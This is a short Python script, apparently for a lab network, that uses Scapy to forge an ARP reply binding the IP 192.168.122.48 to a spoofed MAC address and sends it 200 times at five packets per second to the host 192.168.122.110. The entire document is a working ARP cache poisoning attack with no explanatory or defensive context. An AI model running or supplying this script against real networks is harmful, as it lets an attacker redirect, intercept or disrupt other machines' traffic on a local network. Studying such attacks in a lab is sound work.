from scapy.all import ARP, Ether, sendp
import time

packet = Ether(dst="0c:83:01:80:00:03", src="0c:38:66:2f:00:02") / \
         ARP(op=2, psrc="192.168.122.48", hwsrc="0c:38:66:2f:00:02",
                    pdst="192.168.122.110", hwdst="0c:83:01:80:00:03")

# Send at a rate of 5 packets per second
for i in range(200):
        sendp(packet, iface = "enp0s5", verbose=0)
        time.sleep(0.2) #0.2s = 5 per second
